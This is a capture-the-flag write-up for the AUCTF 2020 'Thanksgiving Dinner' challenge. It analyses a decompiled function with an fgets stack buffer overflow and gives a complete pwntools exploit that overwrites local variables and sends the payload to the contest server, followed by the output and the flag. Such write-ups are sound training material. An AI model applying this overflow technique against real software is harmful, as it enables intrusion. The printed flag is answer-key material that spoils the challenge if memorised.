# AUCTF 2020

## Thanksgiving Dinner

> 408
> 
> I just ate a huge dinner. I can barley eat anymore... so please don't give me too much!
> 
> `nc challenges.auctf.com 30011`
>
> Note: ASLR is disabled for this challenge
>
> Author: nadrojisk
>
> [turkey](turkey)

Tags: _pwn_ _bof_


### Analysis

#### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

No stack canary, look for buffer overflow first.

#### Decompile with Ghidra, cutter.re, r2, etc...

```
void vulnerable(void)
{
  char local_30 [16];
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  
  puts("Hey I heard you are searching for flags! Well I\'ve got one. :)");
  puts("Here you can have part of it!");
  puts("auctf{");
  puts("\nSorry that\'s all I got!\n");
  local_10 = 0;
  local_14 = 10;
  local_18 = 0x14;
  local_1c = 0x14;
  local_20 = 2;
  fgets(local_30,0x24,stdin);
  if ((((local_10 == 0x1337) && (local_14 < -0x14)) && (local_1c != 0x14)) &&
     ((local_18 == 0x667463 && (local_20 == 0x2a)))) {
    print_flag();
  }
  return;
}
```

`fgets` will read 35 (0x24 - 1) characters into `local_30` overrunning local_20 - local10.  The required conditions to get the flag are pretty clear.


### Exploit

#### Code

```
#!/usr/bin/env python3

from pwn import *

payload  = 16 * b'A'
payload += p32(0x2a)
payload += p32(0x0)
payload += p32(0x667463)
payload += p32(2**32 - 0x14 - 1)
payload += p32(0x1337)

#p = process('./turkey')
p = remote('challenges.auctf.com', 30011)
p.recvuntil('got!\n\n')
p.sendline(payload)
p.stream()
```

#### Output

```
# ./exploit.py
[x] Opening connection to challenges.auctf.com on port 30011
[x] Opening connection to challenges.auctf.com on port 30011: Trying 157.245.252.113
[+] Opening connection to challenges.auctf.com on port 30011: Done
Wait... you aren't supposed to be here!!
auctf{I_s@id_1_w@s_fu11!}
```

#### Flag

```
auctf{I_s@id_1_w@s_fu11!}
```
